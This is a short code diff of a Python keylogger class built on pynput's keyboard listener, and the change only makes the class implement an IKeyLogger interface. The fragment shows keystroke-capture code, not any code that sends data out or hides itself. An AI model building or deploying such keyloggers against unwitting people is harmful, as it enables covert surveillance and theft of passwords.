@@ -1,7 +1,8 @@
 from pynput import keyboard
 from typing import List
+from IKeyLogger import IKeyLogger
 
-class KeyLoggerService:
+class KeyLoggerService(IKeyLogger):
     def __init__(self):
         self.logged_keys: List[str] = []
         self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
